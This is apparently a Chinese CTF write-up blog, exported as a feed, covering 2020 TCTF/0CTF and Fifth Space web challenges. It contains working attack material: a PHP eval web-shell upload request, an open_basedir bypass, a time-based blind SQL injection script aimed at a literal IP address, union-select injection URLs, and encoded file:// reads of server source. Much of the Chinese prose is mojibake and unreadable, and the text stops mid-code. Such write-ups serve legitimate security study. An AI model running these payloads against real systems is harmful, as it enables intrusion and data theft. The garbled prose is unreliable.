<p><img src="/2020/07/01/2020TCTF0CTFWeb%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/image-20200707100729914.png" alt="image-20200707100729914"></p>
<p>nu1låšæ³•ï¼š</p>
<p>ä»»æ„æ³¨å†Œè´¦å·ï¼Œåªè¦info[â€œlotteryâ€]åä¸¤ä½ä¸ºf6ï¼Œç„¶åæ‹¼æ¥åŸuserçš„encã€‚</p>
<p><img src="/2020/07/01/2020TCTF0CTFWeb%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/image-20200707103111591.png" alt="image-20200707103111591"></p>
<blockquote>
<p>ä¸ªäººæ„Ÿè§‰å‡ºç°æ¼æ´çš„åŸå› æ˜¯åœ¨å…‘æ¢å½©ç¥¨æ—¶ï¼ŒæœåŠ¡å™¨æ²¡æœ‰æ£€æŸ¥å…‘æ¢å½©ç¥¨çš„äººæ˜¯ä¸æ˜¯ä¹°å½©ç¥¨çš„äººã€‚åº”è¯¥ç¦æ­¢çº¿ä¸Šä»£ç†å…‘æ¢å½©ç¥¨ã€‚</p>
</blockquote>
<h1 id="0x04-Cloud-Computing"><a href="#0x04-Cloud-Computing" class="headerlink" title="0x04 Cloud Computing"></a>0x04 Cloud Computing</h1><p>sandbox/0d3875a1ef234783393169ab868290f038826727/</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="string">'function.php'</span>;</span><br><span class="line"></span><br><span class="line">$dir = <span class="string">'sandbox/'</span> . sha1($_SERVER[<span class="string">'REMOTE_ADDR'</span>] . $_SERVER[<span class="string">'HTTP_USER_AGENT'</span>]) . <span class="string">'/'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!file_exists($dir))&#123;</span><br><span class="line">  mkdir($dir);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">switch</span> ($_GET[<span class="string">"action"</span>] ?? <span class="string">""</span>) &#123;</span><br><span class="line">  <span class="keyword">case</span> <span class="string">'pwd'</span>:</span><br><span class="line">    <span class="keyword">echo</span> $dir;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  <span class="keyword">case</span> <span class="string">'upload'</span>:</span><br><span class="line">    $data = $_GET[<span class="string">"data"</span>] ?? <span class="string">""</span>;</span><br><span class="line">    <span class="keyword">if</span> (waf($data)) &#123;</span><br><span class="line">      <span class="keyword">die</span>(<span class="string">'waf sucks...'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    file_put_contents(<span class="string">"$dir"</span> . <span class="string">"index.php"</span>, $data);</span><br><span class="line">  <span class="keyword">case</span> <span class="string">'shell'</span>:</span><br><span class="line">    initShellEnv($dir);</span><br><span class="line">    <span class="keyword">include</span> $dir . <span class="string">"index.php"</span>;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  <span class="keyword">default</span>:</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æ²¡æœ‰æŠ¥é”™ï¼Œè¿‡æ»¤äº†å¾ˆå¤šåˆ©ç”¨eval(end(getallheaders()));</p>
<blockquote>
<p>åˆ©ç”¨error_reporting(-1);å¼€å¯æŠ¥é”™ã€‚</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;?action&#x3D;upload&amp;data&#x3D;&lt;?&#x3D;eval(end(getallheaders())); HTTP&#x2F;1.1</span><br><span class="line">Host: pwnable.org:47780</span><br><span class="line">Cache-Control: max-age&#x3D;0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;80.0.3987.149 Safari&#x2F;537.36</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.9,en-US;q&#x3D;0.8,en;q&#x3D;0.7,zh-TW;q&#x3D;0.6</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Content-Length: 33</span><br><span class="line">Connection: eval($_POST[cmd]);</span><br><span class="line"></span><br><span class="line">cmd&#x3D;error_reporting(-1);echo 233;</span><br></pre></td></tr></table></figure>

<p>ä¸èƒ½çœ‹phpinfo()ï¼Œåˆ©ç”¨æŠ¥é”™å¯ä»¥çŸ¥é“æœ‰open_basediré™åˆ¶ï¼Œå› ä¸ºåœ¨sandboxé‡Œå¯ä»¥æ–°å»ºæ–‡ä»¶å¤¹ï¼Œç„¶å</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;?action&#x3D;upload&amp;data&#x3D;&lt;?&#x3D;eval(end(getallheaders())); HTTP&#x2F;1.1</span><br><span class="line">Host: pwnable.org:47780</span><br><span class="line">Cache-Control: max-age&#x3D;0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;80.0.3987.149 Safari&#x2F;537.36</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.9,en-US;q&#x3D;0.8,en;q&#x3D;0.7,zh-TW;q&#x3D;0.6</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Content-Length: 241</span><br><span class="line">Connection: eval($_POST[cmd]);</span><br><span class="line"></span><br><span class="line">cmd&#x3D;chdir(&#39;sandbox&#x2F;0d3875a1ef234783393169ab868290f038826727&#x2F;&#39;);mkdir(&quot;img&quot;);chdir(&quot;img&quot;);ini_set(&#39;open_basedir&#39;,&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);ini_set(&#39;open_basedir&#39;,&#39;&#x2F;&#39;);var_dump(scandir(&#39;&#x2F;&#39;));</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/01/2020TCTF0CTFWeb%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/image-20200707210915967.png" alt="image-20200707210915967"></p>
<p>ç„¶åè¯»flagã€‚æ˜¯ä¹±ç ï¼Œçœ‹wpè¯´æ˜¯ç”¨foremostå¾—åˆ°flagï¼Œæ²¡æœ‰è¯•æˆåŠŸã€‚</p>
<h1 id="0x05-Cloud-Computing-v2"><a href="#0x05-Cloud-Computing-v2" class="headerlink" title="0x05 Cloud Computing v2"></a>0x05 Cloud Computing v2</h1><blockquote>
<p>var_dump(get_defined_functions(1));å¯ä»¥å¾—åˆ°å¯ç”¨çš„å‡½æ•°ã€‚</p>
</blockquote>
<p>web goé€†å‘ï¼Œä»£ç åŒä¸Šä¸€é¢˜ï¼Œç¦äº†<code>chdirã€chrã€dirã€scandirã€mb_send_mailã€ob_end_cleanã€ob_get_contentsã€ob_startã€readdirã€realpath</code>è¿™äº›å‡½æ•°ã€‚</p>
<p>ä¸èƒ½ç”¨chdiræ¥ç»•è¿‡open_basedirã€‚å†…ç½‘å¼€äº†80ç«¯å£ï¼Œ</p>
<p><img src="/2020/07/01/2020TCTF0CTFWeb%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/image-20200707222532253.png" alt="image-20200707222532253"></p>
<p>ä¸‹è½½/agent</p>
<p>ä¹‹åå°±æ˜¯é€†å‘äº†ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚</p>
<h1 id="0x06-amp2020"><a href="#0x06-amp2020" class="headerlink" title="0x06 amp2020"></a>0x06 amp2020</h1><p><img src="/2020/07/01/2020TCTF0CTFWeb%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/image-20200706211703521.png" alt="image-20200706211703521"></p>
<p><a href="http://pwnable.org:33000/users/login" target="_blank" rel="noopener">http://pwnable.org:33000/users/login</a></p>
<p>å‚è€ƒ</p>
<p><a href="https://skysec.top/2020/06/27/2020-TCTF-Online-Web-WriteUp/" target="_blank" rel="noopener">https://skysec.top/2020/06/27/2020-TCTF-Online-Web-WriteUp/</a></p>
<p><a href="http://igml.top/2020/06/29/2020-TCTF-0CTF-éƒ¨åˆ†wp/" target="_blank" rel="noopener">http://igml.top/2020/06/29/2020-TCTF-0CTF-%E9%83%A8%E5%88%86wp/</a></p>
<p><a href="https://cjm00n.top/CTF/tctf-2020-wp.html" target="_blank" rel="noopener">https://cjm00n.top/CTF/tctf-2020-wp.html</a></p>
]]></content>
      <tags>
        <tag>writeup</tag>
      </tags>
  </entry>
  <entry>
    <title>ç¬¬äº”ç©ºé—´æ™ºèƒ½å®‰å…¨å¤§èµ›Webé¢˜è§£</title>
    <url>/2020/06/24/%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4%E6%99%BA%E8%83%BD%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9BWeb%E9%A2%98%E8%A7%A3/</url>
    <content><![CDATA[<p> ç¬¬äº”ç©ºé—´webé¢˜ç›®é¢˜è§£</p>
<a id="more"></a>

<h1 id="0x01-ç¾å›¢å¤–å–"><a href="#0x01-ç¾å›¢å¤–å–" class="headerlink" title="0x01 ç¾å›¢å¤–å–"></a>0x01 ç¾å›¢å¤–å–</h1><p><a href="http://www.zipæºç æ³„éœ²ï¼Œå®¡è®¡æºç ï¼Œåœ¨daochu.phpä¸­å­˜åœ¨sqlæ³¨å…¥ï¼Œ" target="_blank" rel="noopener">www.zipæºç æ³„éœ²ï¼Œå®¡è®¡æºç ï¼Œåœ¨daochu.phpä¸­å­˜åœ¨sqlæ³¨å…¥ï¼Œ</a></p>
<p><img src="/2020/06/24/%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4%E6%99%BA%E8%83%BD%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9BWeb%E9%A2%98%E8%A7%A3/image-20200624212541399.png" alt="image-20200624212541399"></p>
<p>å¯ä»¥çœ‹åˆ°æ²¡æœ‰ä»»ä½•è¿‡æ»¤ï¼Œè¯¥é¡µé¢ä¸ç”¨ç™»å½•ä¹Ÿå¯ä»¥è®¿é—®è¿™ä¸ªç•Œé¢ï¼Œè€Œä¸”ä¹Ÿæœ‰å›æ˜¾ã€‚ç”±äºä¸çŸ¥é“smså’Œcontentè¡¨çš„åˆ—æ•°ï¼Œå¼€å§‹æµ‹è¯•æ²¡æœ‰æˆåŠŸã€‚</p>
<p>é‡‡ç”¨æ—¶é—´ç›²æ³¨ï¼Œ</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># encoding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url=<span class="string">"http://119.3.183.154/daochu.php?"</span></span><br><span class="line">proxies = &#123;</span><br><span class="line">  		<span class="string">"http"</span>: <span class="string">"http://127.0.0.1:8080"</span>,</span><br><span class="line">		&#125;</span><br><span class="line">flag=<span class="string">""</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#erfenfa</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">	high = <span class="number">127</span></span><br><span class="line">	low = <span class="number">32</span></span><br><span class="line">	mid = (low + high) // <span class="number">2</span></span><br><span class="line">	<span class="keyword">while</span> high &gt; low:</span><br><span class="line">		payload=<span class="string">"type=2&amp;imei=\" and if((ascii(mid((select group_concat(table_NAME) from information_schema.tableS where table_schema=database()),&#123;&#125;,1))&gt;&#123;&#125;),benchmark(10000000,sha(1)),0)-- -"</span></span><br><span class="line">		payload=<span class="string">"type=2&amp;imei=\" and if((ascii(mid((select group_concat(column_NAME) from information_schema.columnS where table_schema=database() and table_name='admin'),&#123;&#125;,1))&gt;&#123;&#125;),benchmark(10000000,sha(1)),0)-- -"</span></span><br><span class="line">		payload=<span class="string">"type=2&amp;imei=\" and if((ascii(mid((select upass admin where id &gt;0 ),&#123;&#125;,1))&gt;&#123;&#125;),benchmark(10000000,sha(1)),0)-- -"</span></span><br><span class="line">		url_1=url+payload.format(i,mid)</span><br><span class="line">		<span class="keyword">print</span> url_1</span><br><span class="line">		s_time=time.time()</span><br><span class="line">		r=requests.get(url_1,proxies=proxies)</span><br><span class="line">		e_time=time.time()</span><br><span class="line">		<span class="comment">#print(r.content)</span></span><br><span class="line">		<span class="keyword">if</span> e_time-s_time&gt;<span class="number">1</span>:</span><br><span class="line">			low=mid+<span class="number">1</span> </span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			high=mid</span><br><span class="line">		mid=(low+high)//<span class="number">2</span></span><br><span class="line">	flag+=chr(mid)</span><br><span class="line">	print(flag) </span><br><span class="line"></span><br><span class="line"><span class="comment">#admin,content,hint,mac,sms</span></span><br><span class="line"><span class="comment">#id uname upass  hints</span></span><br></pre></td></tr></table></figure>

<p>å¯ä»¥å¾—åˆ°hintè¡¨ä¸­çš„hintsä¸º  see_the_dir_956c110ef9decdd920249f5fed9e4427</p>
<p>ç„¶åè®¿é—®/956c110ef9decdd920249f5fed9e4427ï¼Œå¾—åˆ°çš„è¿˜æ˜¯ç™»å½•çš„ç•Œé¢</p>
<p>adminè¡¨ä¸­</p>
<p>uname:  admin  </p>
<p>upass: qweasdzxc  </p>
<p>å¥½åƒæ²¡æœ‰idå­—æ®µ</p>
<p>ä½†æ˜¯ç™»å½•å¤±è´¥ï¼Œçœ‹ç™»å½•çš„ä»£ç é€»è¾‘</p>
<p><img src="/2020/06/24/%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4%E6%99%BA%E8%83%BD%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9BWeb%E9%A2%98%E8%A7%A3/image-20200624223319101.png" alt="image-20200624223319101"></p>
<p>æŒ‰ä»£ç ä¸­çš„æ¥çœ‹ï¼Œæ•°æ®åº“ä¸­çš„upassåº”è¯¥ä¸ºMD5å­—ç¬¦ä¸²ï¼Œè¿™é‡Œå°±åº”è¯¥ç™»ä¸è¿›å»äº†ã€‚</p>
<p>ç„¶åç»§ç»­å®¡è®¡ä»£ç ï¼Œåœ¨lib/webuploader/0.1.5/server/preview.phpçœ‹åˆ°äº†å†™æ–‡ä»¶çš„æ“ä½œï¼Œä»£ç å¦‚ä¸‹</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * æ­¤é¡µé¢ç”¨æ¥ååŠ© IE6/7 é¢„è§ˆå›¾ç‰‡ï¼Œå› ä¸º IE 6/7 ä¸æ”¯æŒ base64</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line">$DIR = <span class="string">'preview'</span>;</span><br><span class="line"><span class="comment">// Create target dir</span></span><br><span class="line"><span class="keyword">if</span> (!file_exists($DIR)) &#123;</span><br><span class="line">    @mkdir($DIR);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$cleanupTargetDir = <span class="keyword">true</span>; <span class="comment">// Remove old files</span></span><br><span class="line">$maxFileAge = <span class="number">5</span> * <span class="number">3600</span>; <span class="comment">// Temp file age in seconds</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ($cleanupTargetDir) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!is_dir($DIR) || !$dir = opendir($DIR)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'&#123;"jsonrpc" : "2.0", "error" : &#123;"code": 100, "message": "Failed to open temp directory."&#125;, "id" : "id"&#125;'</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (($file = readdir($dir)) !== <span class="keyword">false</span>) &#123;</span><br><span class="line">        $tmpfilePath = $DIR . DIRECTORY_SEPARATOR . $file;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Remove temp file if it is older than the max age and is not the current file</span></span><br><span class="line">        <span class="keyword">if</span> (@filemtime($tmpfilePath) &lt; time() - $maxFileAge) &#123;</span><br><span class="line">            @unlink($tmpfilePath);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    closedir($dir);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$src = file_get_contents(<span class="string">'php://input'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">"#^data:image/(\w+);base64,(.*)$#"</span>, $src, $matches)) &#123;</span><br><span class="line"></span><br><span class="line">    $previewUrl = sprintf(</span><br><span class="line">        <span class="string">"%s://%s%s"</span>,</span><br><span class="line">        <span class="keyword">isset</span>($_SERVER[<span class="string">'HTTPS'</span>]) &amp;&amp; $_SERVER[<span class="string">'HTTPS'</span>] != <span class="string">'off'</span> ? <span class="string">'https'</span> : <span class="string">'http'</span>,</span><br><span class="line">        $_SERVER[<span class="string">'HTTP_HOST'</span>],</span><br><span class="line">        $_SERVER[<span class="string">'REQUEST_URI'</span>]</span><br><span class="line">    );</span><br><span class="line">    $previewUrl = str_replace(<span class="string">"preview.php"</span>, <span class="string">""</span>, $previewUrl);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    $base64 = $matches[<span class="number">2</span>];</span><br><span class="line">    $type = $matches[<span class="number">1</span>];</span><br><span class="line">   <span class="keyword">if</span> ($type === <span class="string">'jpeg'</span>||$type===<span class="string">'php'</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"no hacker"</span>);</span><br><span class="line">        <span class="comment">#$type = 'jpg';</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $filename = md5($base64).<span class="string">".$type"</span>;</span><br><span class="line">    $filePath = $DIR.DIRECTORY_SEPARATOR.$filename;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (file_exists($filePath)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'&#123;"jsonrpc" : "2.0", "result" : "'</span>.$previewUrl.<span class="string">'preview/'</span>.$filename.<span class="string">'", "id" : "id"&#125;'</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $data = base64_decode($base64);</span><br><span class="line">        file_put_contents($filePath, $data);</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'&#123;"jsonrpc" : "2.0", "result" : "'</span>.$previewUrl.<span class="string">'preview/'</span>.$filename.<span class="string">'", "id" : "id"&#125;'</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'&#123;"jsonrpc" : "2.0", "error" : &#123;"code": 100, "message": "un recoginized source"&#125;&#125;'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ç›´æ¥è®¿é—®<a href="http://119.3.183.154/lib/webuploader/0.1.5/server/preview.phpæ˜¯404ï¼Œç„¶åå°†sqlæ³¨å…¥å‡ºæ¥çš„956c110ef9decdd920249f5fed9e4427æ¥åˆ°åé¢ï¼Œ" target="_blank" rel="noopener">http://119.3.183.154/lib/webuploader/0.1.5/server/preview.phpæ˜¯404ï¼Œç„¶åå°†sqlæ³¨å…¥å‡ºæ¥çš„956c110ef9decdd920249f5fed9e4427æ¥åˆ°åé¢ï¼Œ</a></p>
<p><a href="http://119.3.183.154/956c110ef9decdd920249f5fed9e4427/lib/webuploader/0.1.5/server/preview.php" target="_blank" rel="noopener">http://119.3.183.154/956c110ef9decdd920249f5fed9e4427/lib/webuploader/0.1.5/server/preview.php</a></p>
<p>å¯ä»¥è®¿é—®ï¼Œä¼šå°†php://inputè¾“å…¥çš„å†…å®¹å†™åˆ°æ–‡ä»¶ä¸­ï¼Œæ ¼å¼ä¸ºdata:image/jpg;base64,dfdgassdgaï¼ˆç±»ä¼¼è¿™ç§ï¼‰</p>
<p><img src="/2020/06/24/%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4%E6%99%BA%E8%83%BD%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9BWeb%E9%A2%98%E8%A7%A3/image-20200624224023437.png" alt="image-20200624224023437"></p>
<p>æç¤ºè¯´å·²ç»æœ‰æœ¨é©¬åœ¨e98a4571cf72b798077d12d6c94629.php</p>
<p>ç„¶åè®¿é—®ï¼Œæ˜¾ç¤ºgetfileï¼Œå°è¯•getä¼ fileå€¼ï¼Œå¯ä»¥å¾—åˆ°flagã€‚</p>
<p><img src="/2020/06/24/%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4%E6%99%BA%E8%83%BD%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9BWeb%E9%A2%98%E8%A7%A3/image-20200624224201195.png" alt="image-20200624224201195"></p>
<p>èµ›åå‘ç°å¯ä»¥ç›´æ¥åˆ©ç”¨å›æ˜¾æ³¨å‡ºæ•°æ®ã€‚</p>
<p>é¦–å…ˆç¡®å®štypeä¸º2æ—¶ï¼Œsmsè¡¨çš„åˆ—æ•°ã€‚</p>
<p><img src="/2020/06/24/%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4%E6%99%BA%E8%83%BD%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9BWeb%E9%A2%98%E8%A7%A3/image-20200625110000373.png" alt="image-20200625110000373"></p>
<p>æœ‰å…«åˆ—ï¼Œç„¶åæŸ¥æ•°æ®ï¼Œ</p>
<p><img src="/2020/06/24/%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4%E6%99%BA%E8%83%BD%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9BWeb%E9%A2%98%E8%A7%A3/image-20200625110234553.png" alt="image-20200625110234553"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;daochu.php?type&#x3D;1&amp;imei&#x3D;%22%20union%20select%201,2,hints,4,5,hints%20from%20hint--%20-</span><br></pre></td></tr></table></figure>

<p><img src="/2020/06/24/%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4%E6%99%BA%E8%83%BD%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9BWeb%E9%A2%98%E8%A7%A3/image-20200624224404494.png" alt="image-20200624224404494"></p>
<h1 id="0x02-do-you-know"><a href="#0x02-do-you-know" class="headerlink" title="0x02 do you know"></a>0x02 <strong>do you know</strong></h1><ul>
<li>éé¢„æœŸï¼š</li>
</ul>
<p>ä»é¢˜ç›®é€»è¾‘ä¸Šæ¥çœ‹ï¼Œè¿™é¢˜åº”è¯¥æ˜¯ç”¨SSRF+XXE+ååºåˆ—åŒ–ï¼Œä½†æ˜¯</p>
<p><img src="/2020/06/24/%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4%E6%99%BA%E8%83%BD%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9BWeb%E9%A2%98%E8%A7%A3/image-20200624224624983.png" alt="image-20200624224624983"></p>
<p>è¿™é‡Œç”¨çš„æ˜¯$_SERVER[â€˜QUERY_STRINGâ€™]æ¥è·å–getè¾“å…¥çš„å€¼ï¼Œå¯ä»¥åˆ©ç”¨urlç¼–ç ç»•è¿‡ï¼Œç›´æ¥åˆ©ç”¨fileåè®®è¯»æ–‡ä»¶ï¼Œ</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">file:&#x2F;&#x2F;&#x2F;var&#x2F;www&#x2F;html&#x2F;index.php</span><br><span class="line">%66%69%6c%65%3a%2f%2f%2f%76%61%72%2f%77%77%77%2f%68%74%6d%6c%2f%69%6e%64%65%78%2e%70%68%70</span><br></pre></td></tr></table></figure>

<p><img src="/2020/06/24/%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4%E6%99%BA%E8%83%BD%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9BWeb%E9%A2%98%E8%A7%A3/image-20200624225042417.png" alt="image-20200624225042417"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">file:&#x2F;&#x2F;&#x2F;var&#x2F;www&#x2F;html&#x2F;xxe.php</span><br><span class="line">%66%69%6c%65%3a%2f%2f%2f%76%61%72%2f%77%77%77%2f%68%74%6d%6c%2f%78%78%65%2e%70%68%70</span><br></pre></td></tr></table></figure>

<p><img src="/2020/06/24/%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4%E6%99%BA%E8%83%BD%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9BWeb%E9%A2%98%E8%A7%A3/image-20200624225155654.png" alt="image-20200624225155654"></p>
<p>ä¾æ¬¡å¾—åˆ°</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">hints.php</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">#there is an main.php</span></span><br><span class="line"><span class="comment">#â€œå¤§ä½¬ï¼Œè¦ä¸å’±ä»¬ç”¨ä¸€ä¸ªå¥½é•¿å¥½é•¿çš„æ•°å­—çš„md5åšé€šä¿¡å¯†ç å§â€</span></span><br><span class="line"><span class="comment">#â€œé‚£ä½ ç»™æˆ‘ç®—ä¸€ä¸ªå‡ºæ¥â€</span></span><br><span class="line"><span class="comment">#â€œå¥½çš„â€</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#å°ç™½æ‰“å¼€äº†win10çš„calcï¼Œå¼€å§‹è®¡ç®—8129947191207+1992100742919</span></span><br><span class="line"><span class="comment">#ç„¶åä»–ç›´æ¥ç”¨é¼ æ ‡å¤åˆ¶äº†ç»“æœï¼Œè®¡ç®—md5å€¼</span></span><br><span class="line"><span class="comment">#â€œå¥½äº†å¤§ä½¬ï¼Œ10122047934126çš„md5å€¼â€</span></span><br><span class="line"><span class="comment">#â€œ6dc6a29df1d7d33166bba5e17e42d2eaå¯¹å§â€</span></span><br><span class="line"><span class="comment">#â€œå“ˆï¼Ÿï¼Ÿï¼Ÿä¸æ˜¯3e3e7d453061d953bce39ed3e82fd2a1å—â€</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#â€œå’±ä»¬å¯¹ä¸€ä¸‹æ•°å­—ï¼Ÿâ€</span></span><br><span class="line"><span class="comment">#â€­10122047934126â€¬</span></span><br><span class="line"><span class="comment">#10122047934126</span></span><br><span class="line"><span class="comment">#â€œè¿™ä¸æ˜¯ä¸€æ ·çš„å—....å’‹å°±md5ä¸ä¸€æ ·äº†.......â€</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#æ‰¾å‡ºæ¥åˆ°åº•å“ªé‡Œå‡ºäº†é—®é¢˜ï¼Œå°±å¯ä»¥çœ‹è¿™é“webé¢˜ç›®äº†</span></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//main.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $object;</span><br><span class="line">    <span class="keyword">public</span> $method;</span><br><span class="line">    <span class="keyword">public</span> $variable;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $o = <span class="keyword">$this</span>-&gt;object;</span><br><span class="line">        $m = <span class="keyword">$this</span>-&gt;method;</span><br><span class="line">        $v = <span class="keyword">$this</span>-&gt;variable;</span><br><span class="line">        $o-&gt;$m();</span><br><span class="line">        <span class="keyword">global</span> $$v;</span><br><span class="line">        $answer = file_get_contents(<span class="string">'flag.php'</span>);</span><br><span class="line">        ob_end_clean();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">read</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        ob_start();</span><br><span class="line">        <span class="keyword">global</span> $answer;</span><br><span class="line">        <span class="keyword">echo</span> $answer;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>($_SERVER[<span class="string">"REMOTE_ADDR"</span>] !== <span class="string">"127.0.0.1"</span>)&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">'show me your identify'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'â€¬'</span>])) &#123;</span><br><span class="line">    unserialize($_GET[<span 